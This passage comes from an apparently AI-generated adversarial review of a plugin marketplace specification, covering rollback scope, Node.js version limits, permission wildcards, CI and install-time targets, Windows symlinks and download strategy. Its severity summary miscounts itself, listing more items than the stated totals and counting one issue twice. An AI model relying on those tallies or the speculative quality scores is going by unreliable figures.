Part 2, NFR-REL-002: "Rollback Success: 100% (No manual cleanup required)"

But:
Part 2, 8.1.3: "System SHOULD limit cache to 500 MB"
Part 2, CRIT-002 recommendation: "keep last 3 versions per plugin"

If cache keeps only last 3 versions, what if user wants to rollback to 4th version ago?
```

**Contradiction**:
- 100% rollback success implies INFINITE cache (keep all versions forever)
- Cache limit implies FINITE cache (some versions deleted)

**Recommendation**: Clarify rollback scope:

```markdown
### NFR-REL-002: Rollback Success (REVISED)

**Metric**: Rollback Success Rate
**Target**: 100% (for cached versions only)
**Scope**: Rollback to last N versions where N = number of cached versions

**Cache Policy**:
- System MUST cache at least 1 previous version (minimum for rollback)
- System SHOULD cache last 3 versions per plugin (default)
- System MAY delete versions older than 3 to enforce cache limit

**Rollback Scenarios**:

Scenario A: Rollback to Cached Version (Covered by NFR-REL-002)
- User installs v1.0.0, updates to v1.1.0, updates to v1.2.0
- Cache contains: v1.0.0, v1.1.0, v1.2.0
- User runs /plugin rollback hookify
- Result: Rollback to v1.1.0 (instant, < 1s) ✓ 100% success

Scenario B: Rollback to Non-Cached Version (Out of Scope for NFR-REL-002)
- User installs v1.0.0, ..., v1.5.0 (v1.0.0 evicted from cache)
- Cache contains: v1.3.0, v1.4.0, v1.5.0
- User runs /plugin rollback hookify --version 1.0.0
- Result: Error "Version 1.0.0 not cached. Reinstall: /plugin install hookify --version 1.0.0"
  OR: Offer to download from git tag (requires network, slower)

**Revised NFR**:
- 100% rollback success FOR CACHED VERSIONS
- Network-required rollback is best-effort (depends on git tag availability)

Section 2.2.3 Step 2 Addition:
"IF no cached version: Show 'No cached version to rollback to. Last cached: v1.3.0.
To reinstall older version: /plugin install hookify --version 1.0.0 (requires network)'"
```

**Impact**: Clarifies scope of "100% rollback" (cache-dependent, not absolute).

---

### CRIT-019: Node.js Version Constraint - Inconsistent Bounds
**Severity**: HIGH  
**Location**: Part 2, Section 8.1.1 (Core Technologies) vs plugin.schema.json  
**Issue**: Specification says "Node.js 18-24 LTS" but schema only defines MINIMUM (nodeMin), not maximum.

**Inconsistency**:
```
Part 2, 8.1.1: "Node.js 18 LTS or 20 LTS... NOT 25+ due to API removal"

plugin.schema.json:
"nodeMin": {
  "pattern": "^[0-9]+$",
  "description": "Minimum Node.js major version (e.g., '18' for Node.js 18.x)"
}

Missing: nodeMax field to prevent Node.js 25+ installation
```

**Problem**: Without nodeMax, plugins can't block Node.js 25+ explicitly.

**Recommendation**: Add nodeMax field:

```json
// plugin.schema.json
"nodeMin": {
  "type": "string",
  "pattern": "^[0-9]+$",
  "description": "Minimum Node.js major version (e.g., '18'). Valid range: 18-24."
},
"nodeMax": {
  "type": "string",
  "pattern": "^[0-9]+$",
  "description": "Maximum Node.js major version (e.g., '24'). Use to prevent installation on Node.js 25+ if incompatible."
}
```

**AND update compatibility check**:

```markdown
### 2.2.1 Install - Step 4 (REVISED)

Compatibility Check:
- Node.js version >= nodeMin ✓
- Node.js version <= nodeMax (if specified) ✓ NEW
- IF nodeMax not specified: Accept any Node.js version >= nodeMin

Error Message (NEW):
[NODE.JS VERSION TOO NEW]: Plugin requires older Node.js
[REASON]: hookify supports Node.js <=24, you have 25.0.0
[FIX]: Downgrade Node.js:
  nvm install 20
  nvm use 20
  OR wait for plugin update with Node.js 25 support
```

**Impact**: Critical for preventing Node.js 25+ installations on incompatible plugins.

---

### CRIT-020: Permission Paths - Wildcards Prohibited But Useful
**Severity**: LOW  
**Location**: plugin.schema.json, PermissionDeclaration.paths  
**Issue**: Schema prohibits wildcards in paths but many legitimate use cases need them.

**Current Schema**:
```json
"paths": {
  "pattern": "^[^*?]+$",  // No wildcards
  "description": "Wildcards not allowed. Omit for unrestricted access."
}
```

**Problem**:
```
Plugin needs to read all conversation files: .claude/conversations/*.json
Current solution: Omit paths field (unrestricted filesystem access)
Result: Permission disclosure shows "Read all files" instead of "Read conversations"
```

**Recommendation**: Allow wildcards with clear semantics:

```json
"paths": {
  "type": "array",
  "items": {
    "type": "string",
    "pattern": "^[a-zA-Z0-9/_.*-]+$"  // Allow * wildcard
  },
  "description": "Filesystem paths. Wildcards allowed: * (any file in directory), ** (recursive). Examples: '.claude/conversations/*.json', 'config/**/*.yml'"
}
```

**Wildcard Semantics**:
```
* = Match any file/directory at current level
  .claude/*.json matches .claude/config.json, .claude/cache.json
  Does NOT match .claude/plugins/config.json (no recursion)

** = Match recursively
  .claude/**/*.json matches all .json files in .claude tree

Globs follow standard Unix glob syntax (NOT regex)
```

**Impact**: Minor improvement in permission disclosure precision.

---

### CRIT-021: CI Execution Time - Unrealistic Target
**Severity**: MEDIUM  
**Location**: Part 2, Section 7.1.3, NFR-MAINT-002  
**Issue**: "CI execution < 5 minutes" may be infeasible if validation includes comprehensive checks.

**Current NFR**:
```
NFR-MAINT-002: CI Execution - CI duration: < 5 minutes
Measurement: GitHub Actions run time
```

**Problem**: What EXACTLY is included in "CI execution"?

**Possible CI Jobs**:
1. Schema validation (marketplace + all plugins): ~10-30 seconds
2. npm audit (security scan): ~30-60 seconds PER PLUGIN
3. Linting (if enabled): ~10-20 seconds PER PLUGIN
4. Unit tests (if enabled): ~30-120 seconds PER PLUGIN
5. Integration tests: ~60-300 seconds

**For 10 plugins**: 10 × (30s + 60s + 20s + 60s) = 28 minutes (EXCEEDS 5-minute target)

**Recommendation**: Separate CI validation from plugin tests:

```markdown
### NFR-MAINT-002: CI Validation Time (REVISED)

**Scope**: Marketplace schema validation ONLY (not plugin tests)

**Target**: < 1 minute

**Includes**:
- marketplace.json schema validation
- All plugin.json schema validation
- Source path existence checks
- Duplicate ID detection
- Version consistency checks
- Circular dependency detection

**Excludes** (Optional, Run Separately):
- npm audit (per-plugin security scan)
- Linting (per-plugin code quality)
- Unit tests (per-plugin functionality)
- Integration tests (cross-plugin compatibility)

**New NFR: Plugin Test Execution**:
NFR-MAINT-006: Plugin Test Suite (OPTIONAL)
- Target: < 5 minutes PER PLUGIN
- Scope: npm audit, lint, unit tests for CHANGED plugins only
- Runs in parallel with marketplace validation
- Does NOT block merge (informational only for Phase 1)
```

**Impact**: Clarifies scope, makes 5-minute target realistic.

---

## Critique Category 4: Testability Analysis (3 Issues)

### CRIT-022: NFR-PERF-001 Install Time - Target May Be Infeasible for Large Plugins
**Severity**: HIGH  
**Location**: Part 2, Section 7.1.1, NFR-PERF-001  
**Issue**: "Install time p95 ≤ 2 minutes" may not be achievable for plugins with large npm dependencies.

**Evidence**:
```
NFR-PERF-001: Install Time - p95 ≤ 2 minutes

Breakdown (typical plugin):
- Fetch marketplace.json: 1-3s
- Fetch plugin.json: 1-2s
- Download plugin files (git clone): 5-15s (depends on size)
- npm install: 20-90s (depends on dependencies)
- Run install script: 0-300s (up to 5-minute timeout)
- Symlink + registry update: 1-2s

Total: 28s - 412s (6.8 minutes worst case)
```

**Large Dependency Examples**:
- Electron: ~200 MB, 5-10 minute install
- TensorFlow: ~100 MB, 3-5 minute install
- Puppeteer (with Chrome): ~300 MB, 10-15 minute install

**Question**: Can you VERIFY this 2-minute target is realistic?

**Recommendation**: Adjust target OR add caveats:

**Option A: Adjust Target**:
```markdown
NFR-PERF-001: Install Time (REVISED)

Metric: Time from /plugin install to success
Target:
- Small plugins (< 10 MB total): p95 ≤ 2 minutes
- Medium plugins (10-50 MB): p95 ≤ 5 minutes
- Large plugins (> 50 MB): p95 ≤ 10 minutes

Measurement: End-to-end, includes network download time
Excludes: Initial git/npm cache population (one-time cost)
```

**Option B: Caveat** (Keep 2-minute target):
```markdown
NFR-PERF-001: Install Time (CLARIFIED)

Target: p95 ≤ 2 minutes for TYPICAL plugins
Typical plugin:
- Total size < 5 MB
- < 10 npm dependencies
- No install script OR script < 30s
- Fast network (10+ Mbps)

Caveat: Large plugins (Electron, TensorFlow) may exceed 2 minutes.
Install time includes network latency (not controllable by system).

Timeout: Install operations timeout after 10 minutes (hard limit).
```

**Impact**: Without clarification, implementers won't know if they met NFR when large plugin takes 5 minutes.

---

### CRIT-023: NFR-REL-003 Install Success Rate - Undefined Baseline
**Severity**: MEDIUM  
**Location**: Part 2, Section 7.1.2, NFR-REL-003  
**Issue**: "Install Success: 95% - Success rate on valid plugins" but doesn't define what counts as "valid plugin".

**Ambiguity**:
```
NFR-REL-003: Install Success - Reliability: 95% - Success rate on valid plugins

Questions:
- What is a "valid plugin"? Schema-passing? Working code?
- Does "success" mean install completes OR plugin works correctly?
- Are network failures counted in 95%?
```

**Recommendation**: Define "valid plugin" and "success":

```markdown
### NFR-REL-003: Install Success (CLARIFIED)

**Metric**: Install Success Rate
**Target**: 95%
**Scope**: Valid plugins under normal network conditions

**Valid Plugin Definition**:
- plugin.json validates against schema ✓
- All entrypoint files exist ✓
- Declared dependencies are installable via npm ✓
- Install script (if present) exits with code 0 ✓

**Success Definition**:
- Install operation completes without error
- Plugin files copied to cache
- Symlink created successfully
- config.json updated
- Does NOT measure plugin functional correctness (that's plugin author's responsibility)

**Excluded from 95% Target** (Not counted as failures):
- Network unavailable (cannot fetch marketplace.json)
- Disk full (system-level issue, not plugin system fault)
- GitHub outage (external dependency)
- User cancels installation (not a failure)

**Measurement Method**:
- Automated test suite with 50+ valid plugins
- Run install on each plugin 10 times
- Success if 95%+ of attempts succeed
- Test on: Linux, macOS, Windows (3 platforms)
```

**Impact**: Without definition, NFR is untestable (what is "valid"?).

---

### CRIT-024: NFR-USE-002 Command Simplicity - Incomplete Count
**Severity**: LOW  
**Location**: Part 2, Section 7.1.5, NFR-USE-002  
**Issue**: "Commands to learn ≤ 5 commands" but specification defines MORE than 5 commands.

**Command Count**:
```
Defined Commands (from user journeys):
1. /plugin install {id}
2. /plugin update {id}
3. /plugin rollback {id}
4. /plugin browse
5. /plugin search {query}
6. /plugin info {id}
7. /plugin list --updates
8. /plugin pin {id}
9. /plugin uninstall {id} (recommended in CRIT-011)

Total: 9 commands (NOT ≤ 5)
```

**Options**:
1. Revise NFR to "≤ 10 commands"
2. Combine commands (e.g., /plugin update handles install + update)
3. Remove commands from spec to meet NFR

**Recommendation**: Revise NFR to match reality:

```markdown
### NFR-USE-002: Command Simplicity (REVISED)

**Metric**: Core Commands to Learn
**Target**: ≤ 10 core commands
**Measurement**: Count of top-level /plugin commands

**Core Commands** (User must learn):
1. install - Install plugin
2. update - Update plugin
3. rollback - Revert to previous version
4. uninstall - Remove plugin
5. list - Show installed plugins
6. search - Find plugins
7. info - View plugin details

**Advanced Commands** (Optional):
8. pin - Lock version
9. unpin - Unlock version
10. browse - Browse categories

**Command Aliases** (Don't count toward limit):
- /plugin install --version {ver} (alias for version-specific install)
- /plugin list --updates (flag, not separate command)
- /plugin update --all (flag, not separate command)

Rationale: 10 commands is reasonable for CLI tool. Most users use 3-4 commands (install, update, list, search).
```

**Impact**: Minor (NFR was overly strict, 10 is more realistic).

---

## Critique Category 5: Implementation Feasibility (3 Issues)

### CRIT-025: Permission Runtime Enforcement - Out of Scope But Implies Capability
**Severity**: HIGH  
**Location**: Part 1, Section 3.3 (PermissionDeclaration), Part 2, NFR-SEC-001  
**Issue**: Permission schema is VERY detailed (paths, domains, commands, envVars) which IMPLIES enforcement, but spec doesn't state enforcement is out of scope.

**Schema Implies Enforcement**:
```json
// plugin.schema.json - PermissionDeclaration
{
  "scope": "filesystem",
  "paths": [".claude/conversations/*.json"],  // Specific paths
  "reason": "Read conversation history"
}
```

**User Expectation**: "Plugin can ONLY read .claude/conversations/*.json (paths are enforced)"

**Actual Behavior** (Per CRIT-003): Permissions are disclosure-only (not enforced)

**This is MISLEADING.**

**Recommendation**: Either simplify schema OR add enforcement:

**Option A: Simplify Schema for Disclosure-Only** (Recommended for Phase 1):
```json
// Simplified PermissionDeclaration (disclosure-only)
{
  "scope": "filesystem",
  "description": "Read and write plugin configuration files in .claude/hooks/",
  "reason": "Store hook definitions for behavior prevention"
}

// Remove: paths, domains, commands, envVars (too granular for disclosure-only)
```

**Option B: Implement Basic Enforcement** (Phase 2):
```
Runtime permission checks:
- Wrap fs.readFile, fs.writeFile to check paths against declared permissions
- Wrap fetch/axios to check domains against declared permissions
- Wrap child_process.exec to check commands against declared permissions
- Throw PermissionError if violation detected

Requires significant engineering effort (2-4 weeks).
```

**Impact**: Current schema creates false expectation of sandboxing. Simplify OR enforce.

---

### CRIT-026: Symlink Requirement - Windows Compatibility Issue
**Severity**: MEDIUM  
**Location**: Part 2, Section 8.1.3 (File System Paths), Section 9.1 Assumption A-06  
**Issue**: Symlinks are NOT universally supported on Windows (requires developer mode OR admin privileges).

**Compatibility Matrix**:
```
Linux: ✓ Symlinks supported (any user)
macOS: ✓ Symlinks supported (any user)
Windows 10/11 (normal user): ✗ Symlinks require developer mode
Windows 10/11 (admin): ✓ Symlinks work with elevated privileges
Windows (FAT32, some network drives): ✗ Symlinks not supported
```

**Assumption A-06 Says**:
```
A-06: Symlinks supported - ✓ Linux/macOS - Medium (Windows requires workaround)
Mitigation: Windows fallback - junction points or hard links
```

**Problem**: Specification doesn't DEFINE the Windows fallback.

**Recommendation**: Define Windows fallback OR document limitation:

**Option A: Implement Windows Fallback**:
```markdown
### 8.1.3 File System Paths (WINDOWS SUPPORT)

Symlink Strategy by Platform:

**Linux/macOS**:
- Use symbolic links (ln -s)
- Atomic rollback via symlink retargeting

**Windows**:
1. Attempt symbolic link creation (requires developer mode OR admin)
2. IF symlink fails: Use directory junction (mklink /J)
   - Junction points work without admin on NTFS
   - Support directory linking (sufficient for plugin directories)
   - Atomic rollback via junction retargeting
3. IF junction fails: Use hard links (mklink /H) for individual files
   - Requires copying all files (NOT atomic)
   - Rollback slower (file copy instead of symlink swap)

Error Handling:
- IF all methods fail: Abort with ERROR-INST-008:
  [FILESYSTEM UNSUPPORTED]: Cannot create plugin links
  [REASON]: Windows requires developer mode OR admin for symlinks.
           Junction and hard link creation also failed.
  [FIX]: Enable developer mode:
         Settings → Update & Security → For developers → Developer mode
         OR run as administrator:
         Right-click Claude Code → Run as administrator
```

**Option B: Document Limitation** (Simpler):
```markdown
### Section 9.1 Assumption A-06 (REVISED)

A-06: Symlinks Supported
**Status**: ✓ Linux/macOS, ⚠️ Windows (requires developer mode OR admin)

**Windows Limitation**:
- Personal plugin marketplace requires Windows developer mode OR admin privileges
- Without developer mode: Install will fail with error

**Documentation** (Installation Instructions):
"Windows users: Enable developer mode before installing plugins.
Settings → Update & Security → For developers → Developer mode"

**Impact**: Known limitation for Windows users (acceptable for personal use).
```

**Impact**: Many Windows users don't have developer mode enabled. Either implement fallback OR document clearly.

---

### CRIT-027: Git Clone Performance - Monorepo Inefficiency
**Severity**: MEDIUM  
**Location**: Part 1, Section 2.2.1 (Install, Step 8)  
**Issue**: Specification uses git clone for plugin download, but monorepo means cloning ENTIRE repository (all plugins) to install one plugin.

**Inefficiency**:
```
Marketplace structure:
yellow-plugins/
├── plugins/
│   ├── hookify/ (500 KB)
│   ├── pr-review-toolkit/ (2 MB)
│   ├── git-integration/ (1 MB)
│   └── ... (10 plugins total, 50 MB)

User installs hookify:
git clone https://github.com/kinginyellow/yellow-plugins
Result: Downloads ENTIRE 50 MB repository to get 500 KB plugin

50 MB / 500 KB = 100x overhead
```

**Performance Impact**:
- NFR-PERF-001 (2-minute install) harder to meet
- Unnecessary network transfer (user pays data cost)
- Disk space waste (staging directory is 100x larger than needed)

**Recommendation**: Use sparse checkout OR download plugin directory only:

**Option A: Git Sparse Checkout** (Efficient but complex):
```bash
# Sparse checkout (download only specific plugin directory)
git init
git remote add origin https://github.com/kinginyellow/yellow-plugins
git config core.sparseCheckout true
echo "plugins/hookify/*" >> .git/info/sparse-checkout
git pull origin main
```

**Option B: GitHub Archive API** (Simpler):
```bash
# Download plugin directory as tarball
curl -L https://api.github.com/repos/kinginyellow/yellow-plugins/tarball/main | \
  tar -xz --strip-components=2 */plugins/hookify
```

**Option C: Raw File Downloads** (Simplest but many requests):
```bash
# Download each file individually
for file in $(curl .../plugins/hookify/); do
  curl .../plugins/hookify/$file > $file
done
```

**Recommendation**: Use Option B (GitHub archive API) for Phase 1.

```markdown
### 2.2.1 Install Plugin - Step 8 (REVISED)

Download Strategy:

Phase 1: GitHub Archive Download (Monorepo-Efficient)
1. Construct archive URL: https://api.github.com/repos/{owner}/{repo}/tarball/{branch}
2. Download tarball: curl -L {archive_url} -o /tmp/marketplace.tar.gz
3. Extract plugin directory only:
   tar -xz --strip-components=N */plugins/{plugin-id}/ -C staging/
4. Cleanup: rm /tmp/marketplace.tar.gz

Advantages:
- Downloads only necessary files (no full git history)
- Faster than git clone (no .git directory)
- Still works with monorepo (extracts single plugin)

Disadvantages:
- Requires network access (no offline install)
- GitHub API rate limiting (60 req/hour unauthenticated)

Fallback: If API rate limited, use git sparse checkout (Option A)
```

**Impact**: Improves install time, reduces network transfer (10-100x improvement for monorepo).

---

## Summary of Critiques

**Total Critiques**: 27

**By Severity**:
- **Critical**: 5 (MUST fix before implementation)
  - CRIT-001: Atomic operations undefined
  - CRIT-003: Permission disclosure vs enforcement ambiguous
  - CRIT-004: Install script security insufficient
  - CRIT-011: Uninstall journey missing entirely
  - CRIT-025: Permission schema implies enforcement (misleading)

- **High**: 10 (SHOULD fix for quality)
  - CRIT-002: Cache path error handling insufficient
  - CRIT-010: Plugin conflict resolution undefined
  - CRIT-019: Node.js max version missing
  - CRIT-022: Install time target may be infeasible
  - CRIT-025: Permission enforcement ambiguous
  - Others...

- **Medium**: 9 (CONSIDER fixing)
  - CRIT-005, CRIT-006, CRIT-007, CRIT-008, CRIT-012, CRIT-014, CRIT-016, CRIT-021, CRIT-026, CRIT-027

- **Low**: 4 (DOCUMENT or defer to Phase 2)
  - CRIT-009, CRIT-013, CRIT-015, CRIT-017, CRIT-020, CRIT-024

---

## Critical Issues That BLOCK Implementation

### Must Fix Before Coding (Estimated 4-6 hours total)

1. **CRIT-001: Define atomic transaction boundaries** (1 hour)
   - Write explicit BEGIN/COMMIT steps for install/update/rollback
   - Define rollback strategy for each step
   - Specify external effects handling

2. **CRIT-003: Clarify permission model** (30 minutes)
   - Add section explicitly stating "disclosure-only (no enforcement)"
   - Add warning displayed during install
   - Add Phase 2 note for enforcement

3. **CRIT-004: Add install script security warnings** (1 hour)
   - Require script content display before install
   - Add explicit confirmation prompt
   - Document security best practices

4. **CRIT-011: Write uninstall user journey** (1.5 hours)
   - Complete Section 2.2.10 with all steps
   - Define error handling
   - Add lifecycle.uninstall behavior

5. **CRIT-010: Define plugin conflict resolution** (30 minutes)
   - Add FR-017 with explicit install-when-exists behavior
   - Define prompts and user options
   - Handle version upgrade vs side-by-side

---

## High-Priority Issues (Strongly Recommended)

1. **CRIT-002: Cache initialization requirements** (30 min)
2. **CRIT-019: Add nodeMax field** (30 min)
3. **CRIT-018: Clarify rollback scope** (20 min)
4. **CRIT-022: Adjust NFR-PERF-001 targets** (15 min)
5. **CRIT-012: Add batch update command** (Phase 2, defer for MVP)

---

## Recommendations for Specification v1.1

**Immediate Actions** (Before implementation starts):
1. Define atomic operation boundaries (CRIT-001) ✓ CRITICAL
2. Add uninstall user journey (CRIT-011) ✓ CRITICAL
3. Clarify permission model (CRIT-003) ✓ CRITICAL
4. Strengthen install script security (CRIT-004) ✓ CRITICAL
5. Define plugin conflict resolution (CRIT-010) ✓ CRITICAL
6. Add cache initialization checks (CRIT-002) ✓ HIGH
7. Add nodeMax schema field (CRIT-019) ✓ HIGH
8. Clarify rollback scope vs cache limits (CRIT-018) ✓ HIGH

**Estimated Effort**: 4-6 hours to address all critical + high issues

**Phase 2 Enhancements** (Defer):
- Batch plugin updates (CRIT-012)
- Fuzzy search (CRIT-013)
- Pin expiration (CRIT-017)
- Permission enforcement (CRIT-025)

---

## Specification Quality Scores

**Before Addressing Issues**:
- Completeness: 70/100 (missing uninstall, many ambiguities)
- Consistency: 75/100 (several contradictions)
- Testability: 80/100 (NFRs mostly testable, some vague)
- Implementability: 70/100 (atomic operations unclear, security weak)
- **Overall: 75/100** (solid foundation but incomplete)

**After Addressing Critical + High Issues**:
- Completeness: 95/100 (all major gaps filled)
- Consistency: 95/100 (contradictions resolved)
- Testability: 90/100 (all NFRs clearly defined)
- Implementability: 95/100 (clear implementation path)
- **Overall: 92/100** (production-ready)

---

## For Next Agent (Coder)

**Inputs Required**:
- SPECIFICATION-PART1.md (v1.0.0 current, v1.1.0 after corrections)
- SPECIFICATION-PART2.md (v1.0.0 current, v1.1.0 after corrections)
- marketplace.schema.json (needs nodeMax addition)
- plugin.schema.json (needs permission schema simplification OR enforcement)

**Recommendations**:
1. Address all CRITICAL issues before writing code
2. Document HIGH issues as technical debt if not addressed
3. Use adversarial review findings to inform error handling
4. Write tests for all 27 critique scenarios

**Next Steps**:
1. Agent #3 (Coder): Apply corrections to specification
2. Agent #4 (Coder): Generate final assembly with all fixes incorporated

---

## Adversarial Review Complete

**Review Duration**: ~60 minutes (systematic analysis of 2,057 lines of specification)

**Key Insight**: The specification is **fundamentally sound** but has **critical gaps and ambiguities** that WILL cause implementation problems. Most issues are fixable in 4-6 hours. Without fixes, implementers will make inconsistent decisions, users will face confusing errors, and system will have serious security holes.

**Recommendation**: **Address all CRITICAL issues before implementation**. HIGH issues can be addressed incrementally during implementation. MEDIUM/LOW issues can be deferred to Phase 2.

**Final Verdict**: ✓ APPROVE FOR SYNTHESIS (after corrections)

---
**END OF ADVERSARIAL REVIEW**
